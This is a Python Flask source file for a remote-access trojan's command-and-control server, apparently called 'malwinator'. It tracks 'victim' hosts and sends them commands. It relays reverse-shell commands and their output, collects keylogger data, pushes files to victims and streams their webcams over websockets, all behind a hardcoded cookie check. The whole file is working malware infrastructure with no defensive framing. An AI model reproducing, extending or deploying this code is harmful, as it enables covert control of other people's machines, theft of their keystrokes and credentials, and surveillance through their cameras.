from flask import Flask, request, send_file, render_template
import os, time
import threading
from flask_socketio import SocketIO
import socket


app = Flask(__name__)
socketio = SocketIO(app)

''' The hosts dictonary form
  hosts [(ip, host_name)] = {
    'status': Up/Down
    'command': string
    'log': string[]
  }
'''
hosts = {}


def send_command(name, ip, command):
  global hosts
  key = (ip, name)
  
  hosts[key]['command'] = command
  if hosts[key]['lock'].locked():
    hosts[key]['lock'].release()
    return 0
  
  return 1

# interface routes
@app.route('/')
def displayHosts():
  if request.cookies.get('superSecretKey') != 'c457r4v371':
    return render_template('notLoggedIn.html')
  global hosts
  for host in hosts:
    # ping the hosts to see who's up
    hosts[host]['command'] = 'ping'
    hosts[host]['status'] = 'Down'

    # sending the ping command
    if hosts[host]['lock'].locked():
      hosts[host]['lock'].release()

  time.sleep(1) # waiting 1s for responses

  keys = []
  for ip, name in hosts:
    keys.append((ip, name, hosts[(ip,name)]['status']))

  return render_template('index.html', keys = keys)


# server handshake to keep track of each host
@app.route('/handshake', methods = ['POST'])
def handshake():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 'command_result' : ''}
  hosts[key]['lock'].acquire()
  return 'Request accepted', 200

@app.route('/pong', methods = ['POST'])
def pong():
  global hosts

  # this is where hosts can send their ping responses 
  # after a response the host status will be set
  key = (request.remote_addr, request.form['name'])
  hosts[key]['status'] = 'Up'

  return 'Pong sent.', 200

# the client is waiting here for the commands
@app.route('/ready', methods = ['POST'])
def timeout():
  global hosts
  key = (request.remote_addr, request.form['name'])

  # the host blocks until the command is ready
  hosts[key]['lock'].acquire()
  
  # when the mutex is unlocked the command is sent to the host
  return hosts[key]['command'], 200

# this is for the general interface where you can pick different tools to control one victim
@app.route('/toolkit', methods = ['GET'])
def show_toolkit():
  if request.cookies.get('superSecretKey') != 'c457r4v371':
    return render_template('notLoggedIn.html')
  global hosts

  name = request.args.get('name')
  ip = request.args.get('ip')

  return render_template('toolkit.html', name = name, ip = ip)

# this route is for sending data (especially commands) to the host
@app.route('/send', methods = ['POST'])
def send_process():
  global hosts
  name = request.form['name']
  ip = request.form['ip']
  command = request.form['command'] 
  if not send_command(name, ip, command):
    return "0", 200
  return "1", 200

# the route for reverse shell contorl
@app.route('/shell', methods = ['GET', 'POST'])
def shell():
  global hosts 
  
  if request.method == 'GET':
    if request.cookies.get('superSecretKey') != 'c457r4v371':
      return render_template('notLoggedIn.html')
    name = request.args.get('name')
    ip = request.args.get('ip')

    return render_template('command.html', name = name, ip = ip)
  
  elif request.method == 'POST':
    name = request.form['name']
    ip = request.form['ip']
    command = request.form['command'] 
    if send_command(name, ip, "shell "+ command):
      hosts[(ip,name)]['command_result'] = "Command failed!"
    return render_template('command.html', name = name, ip = ip, last_command=command)
    

# this is where the victim will send the command result
@app.route('/result', methods = ['POST'])
def result():
  if request.cookies.get('superSecretKey') != 'c457r4v371':
    return render_template('notLoggedIn.html')
  global hosts
  
  key = (request.remote_addr, request.form['name'])
  hosts[key]['command_result'] = request.form['result']

  return 'Ok', 200

# this is where the web browser will call for the command result
@app.route('/getResult', methods = ['POST'])
def get_result():
  global hosts
  name = request.form['name']
  ip = request.form['ip']
  key = (ip, name)
  return hosts[key]['command_result']

# this is where the host can send it's keylog data
@app.route('/log', methods = ['POST'])
def log_post():
  global hosts
  
  key = (request.remote_addr, request.form['name'])
  hosts[key]['log'].append(request.form['key'])

  return 'Ok', 200

# this route if for clearing the log buffer
@app.route('/clearLog', methods = ['POST'])
def log_clear():
  global hosts
  
  key = (request.remote_addr, request.form['name'])
  hosts[key]['log'].clear()

  return 'Ok', 200

# this is where the web browser will call for keylog data
@app.route('/getLog', methods = ['GET', 'POST'])
def getLog():
  global hosts

  if request.method == 'GET':
    if request.cookies.get('superSecretKey') != 'c457r4v371':
      return render_template('notLoggedIn.html')
    name = request.args.get('name')
    ip = request.args.get('ip')
    
    return render_template('log.html', name = name, ip = ip, message="Log data:")
  
  elif request.method == 'POST':
    name = request.form['name']
    ip = request.form['ip']
    key = (ip, name)
    return ''.join(hosts[key]['log'])
  
  return "Method not allowed", 403

# the download route for the download command
@app.route('/download', methods = ['POST'])
def download():
  file = request.form['file']
  path = './resources/' + file
  if os.path.exists(path):
    return send_file(path, as_attachment = True)
  else:
    return 'File not found', 404

# route to the file uploading interface
@app.route('/upload', methods = ['GET'])
def upload():
  if request.cookies.get('superSecretKey') != 'c457r4v371':
    return render_template('notLoggedIn.html')
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')

  #get the files available for upload
  file_list = os.listdir("./resources")

  return render_template('upload.html', name = name, ip = ip, files = file_list)

# this is for the web sockets designed for camera access
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

@socketio.on('stream')
def handle_stream(data):
    # Broadcast received JPEG data to all clients
    socketio.emit('stream', data)

@app.route('/viewCamera', methods=['GET'])
def view_camera():
  if request.cookies.get('superSecretKey') != 'c457r4v371':
    return render_template('notLoggedIn.html')
  return render_template('camera.html', name=request.args.get('name'), ip=request.args.get('ip')) 


# https server
# if __name__ == '__main__':
#   socketio.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')

# http server
# if __name__ == "__main__":
#   socketio.run(app, host='0.0.0.0', port='5000')

# # localhost server
if __name__ == "__main__":
  socketio.run(host='127.0.0.1', port='8088')
